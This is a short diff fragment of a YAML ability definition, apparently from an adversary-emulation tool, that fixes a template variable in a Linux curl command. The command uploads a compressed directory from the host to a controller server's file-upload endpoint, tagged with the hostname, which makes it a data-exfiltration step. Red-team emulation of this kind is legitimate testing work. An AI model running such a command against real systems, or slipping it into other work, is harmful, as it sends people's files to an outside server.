@@ -15,7 +15,7 @@
     linux:
       sh:
         command: |
-          curl -F "data=@#{host.dir.compress}" --header "X-Request-ID: `hostname`-{paw}" #{server}/file/upload
+          curl -F "data=@#{host.dir.compress}" --header "X-Request-ID: `hostname`-#{paw}" #{server}/file/upload
     windows:
       psh,pwsh:
         # REF: https://stackoverflow.com/a/45409728
